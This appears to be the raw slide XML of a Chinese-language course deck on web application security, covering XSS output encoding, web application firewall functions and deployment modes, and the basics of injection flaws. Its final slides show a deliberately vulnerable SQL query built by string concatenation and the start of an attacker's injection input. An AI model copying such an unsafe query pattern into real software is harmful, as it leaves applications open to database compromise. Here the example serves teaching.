              </a:rPr>
              <a:t>gt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>;’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宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>‘(‘  ,  ‘)’   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>  ‘&amp;#40;’  ,  ‘&amp;#41;’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宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>‘#‘ , ‘&amp;’  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty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dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>  ‘&amp;#35;’   ,  ‘&amp;#38;‘</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>对用户进行培训，告知小心使用电子邮件消息或即时消息中的链接；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>防止访问已知的恶意网站；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>执行手工或自动化代码扫描，确定并消除潜在的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>漏洞。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6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6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6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6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666" name="Line 2"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm flipV="1">
            <a:off x="1553830" y="4011796"/>
            <a:ext cx="6253738" cy="31621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77671" name="Rectangle 7"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm rot="3419336">
            <a:off x="1261728" y="1900301"/>
            <a:ext cx="479425" cy="520700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="669900"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:miter lim="800000"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rgbClr val="669900"/>
            </a:extrusionClr>
          </a:sp3d>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr">
            <a:flatTx/>
          </a:bodyPr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77672" name="Text Box 8"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="1338692" y="1939988"/>
            <a:ext cx="301685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kumimoji="0" lang="en-US" altLang="zh-CN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</a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1777673" name="Line 9"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm flipV="1">
            <a:off x="1536366" y="2482360"/>
            <a:ext cx="6253738" cy="24365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77674" name="Text Box 10"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="2104691" y="1851715"/>
            <a:ext cx="5685413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kumimoji="0" sz="3200">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>应用体系结构脆弱性分析</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1777675" name="Text Box 11"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="2122155" y="3421583"/>
            <a:ext cx="5702877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常见</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="zh-CN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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0"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应用攻击及防范</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1777676" name="Rectangle 1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/>
              <a:t>内容提纲</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1777679" name="Rectangle 15"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm rot="3419336">
            <a:off x="1279192" y="3448105"/>
            <a:ext cx="479425" cy="520700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="9369E7"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:miter lim="800000"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rgbClr val="9369E7"/>
            </a:extrusionClr>
          </a:sp3d>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr">
            <a:flatTx/>
          </a:bodyPr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77680" name="Text Box 16"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="1356156" y="3468742"/>
            <a:ext cx="301685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kumimoji="0" lang="en-US" altLang="zh-CN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gray">
          <a:xfrm rot="3419336">
            <a:off x="1242678" y="5134070"/>
            <a:ext cx="479425" cy="520700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="669900"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
          <a:scene3d>
            <a:camera prst="legacyPerspectiveFront">
              <a:rot lat="0" lon="1500000" rev="0"/>
            </a:camera>
            <a:lightRig rig="legacyFlat4" dir="b"/>
          </a:scene3d>
          <a:sp3d extrusionH="430200" prstMaterial="legacyMatte">
            <a:bevelT w="13500" h="13500" prst="angle"/>
            <a:bevelB w="13500" h="13500" prst="angle"/>
            <a:extrusionClr>
              <a:srgbClr val="669900"/>
            </a:extrusionClr>
          </a:sp3d>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr">
            <a:flatTx/>
          </a:bodyPr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gray">
          <a:xfrm>
            <a:off x="2104690" y="5051566"/>
            <a:ext cx="5685413" cy="579437"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF6600"/>
          </a:solidFill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eaLnBrk="0" hangingPunct="0">
              <a:defRPr kumimoji="0" sz="3200">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>应用防火墙</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>WAF</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/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gray">
          <a:xfrm>
            <a:off x="1346628" y="5165820"/>
            <a:ext cx="301686" cy="36933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kumimoji="0" lang="en-US" altLang="zh-CN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</a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Line 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm flipV="1">
            <a:off x="1522078" y="5673819"/>
            <a:ext cx="6268026" cy="46037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tailEnd type="oval" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr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push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有了网络防火墙，为什么还不够？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7" y="2961958"/>
            <a:ext cx="6600825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44959" y="1346344"/>
            <a:ext cx="8111114" cy="4902055"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>应用防火墙（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web Application Firewall, WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>）是一种专门保护</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>应用免受本章前面介绍的各种</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>应用攻击的安全防护系统，对每一个</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTP/HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>请求进行内容检测和验证，确保每个用户请求有效且安全的情况下才交给</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>服务器处理，对非法的请求予以实时阻断或隔离、记录、告警等，确保</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>应用的安全性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61" y="1691323"/>
            <a:ext cx="6653183" cy="4114800"/>
          </a:xfr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3092" y="1340802"/>
            <a:ext cx="8058467" cy="4755197"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>基本安全功能：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>防止常见的各类网络攻击，如：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>注入、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>跨站、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、网页后门等；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>防止各类自动化攻击，如：暴力破解、撞库、批量注册、自动发贴等；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>阻止其它常见威胁，如：爬虫、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>0 DAY</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>攻击、代码分析、嗅探、数据篡改、越权访问、敏感信息泄漏、应用层</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>DDoS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、盗链、越权、扫描等。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3092" y="1340802"/>
            <a:ext cx="8058467" cy="4755197"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>基本安全功能：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575" y="1996440"/>
            <a:ext cx="4137500" cy="390143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基本原理</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>主要提供对</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>应用层数据的解析，对不同的编码方式做强制多重转换还原为可分析的明文，对转换后的消息进行深度分析。主要的分析方法主要有两类，一类是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>基于规则的分析方法</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>，另一类是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>异常检测方法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r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>部署</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>部署在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>服务器的前面，一般是串行接入，不仅在硬件性能上要求高，而且不能影响</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>服务，同时还要与负载均衡、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web Cache</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>等</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>服务器前的常见产品协调部署</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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3093" y="1417003"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>部署</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的部署模式有三种：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>反向代理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透明代理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旁路</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>。常用的是反向、透明两种模式，因为旁路只有监听功能，不能对访问进行拦截、没有防护能力，因此使用的较少。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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3093" y="1417003"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>部署：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>反向代理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150938" y="2281237"/>
            <a:ext cx="6973888" cy="3250566"/>
            <a:chOff x="1150938" y="2281237"/>
            <a:chExt cx="6973888" cy="325056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0938" y="2281237"/>
              <a:ext cx="6436043" cy="3250566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2856144" y="4343400"/>
              <a:ext cx="1415772" cy="8309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反向代码</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="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/>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="2400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WAF</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="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401277" y="4112567"/>
              <a:ext cx="1723549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400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原始服务器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57413" y="4297233"/>
              <a:ext cx="800219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400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用户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3093" y="1417003"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>部署：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>透明代理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1080095" y="2508884"/>
            <a:ext cx="6862751" cy="2291715"/>
            <a:chOff x="1080095" y="2508884"/>
            <a:chExt cx="6862751" cy="229171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0938" y="2508884"/>
              <a:ext cx="6399531" cy="2291715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4014384" y="4175760"/>
              <a:ext cx="2066143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400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透明代码</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="2400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WAF</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="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219297" y="3944927"/>
              <a:ext cx="1723549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400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原始服务器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80095" y="4025592"/>
              <a:ext cx="800219" cy="4616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400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用户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799" y="1371600"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>部署</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/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2" y="1371600"/>
            <a:ext cx="5435917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171575" y="1101725"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>部署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WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>与网络防火墙能一起部署吗？</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1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2225040"/>
            <a:ext cx="4724400" cy="40995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96640"/>
            <a:ext cx="3097530" cy="9210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产品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WAF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902" y="1280161"/>
            <a:ext cx="5584191" cy="50320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96913" y="2571749"/>
            <a:ext cx="7772400" cy="2449513"/>
          </a:xfrm>
        </p:spPr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以下课件请课下自学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（二）注入漏洞</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4167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435975" cy="424973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en-US" altLang="zh-CN" sz="3200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Injection flaws</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" dirty="0"/>
              <a:t>, particularly SQL injection, are common in web applications. Injection occurs when user-supplied data is sent to an interpreter as part of a command or query. The attacker’s hostile data </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>tricks the interpreter into executing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" dirty="0"/>
              <a:t> unintended commands or changing data.</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="416773" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="468313" y="1235075"/>
            <a:ext cx="3763962" cy="579438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20000"/>
              </a:spcBef>
              <a:buFont typeface="Webdings" panose="05030102010509060703" pitchFamily="18" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>OWASP Definition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6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注入漏洞</a:t>
            </a:r>
          </a:p>
        </p:txBody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52550"/>
            <a:ext cx="8229600" cy="2646363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>最普遍的注入漏洞包括：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>注入：通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>语句恶意地调用后台数据库</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>系统调用</a:t>
            </a:r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shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>命令调用外部程序</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="442372" name="Text Box 4"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="900113" y="4067175"/>
            <a:ext cx="6624637" cy="94615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800" b="1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任何依赖于解释执行的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="1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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1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应用都有被注入漏洞攻击的危险！</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" b="1">
              <a:solidFill>
                <a:srgbClr val="CC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SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>注入原理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43000"/>
            <a:ext cx="8686800" cy="5257800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>例子：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>通过用户提供的参数来查询表中的数据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"SELECT * FROM USERS WHERE SSN=‘" + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>ssn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t> + "’“</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>SSN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>参数来自于用户的输入：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>参数未经验证或编码</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>黑客输入： </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>1234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/>
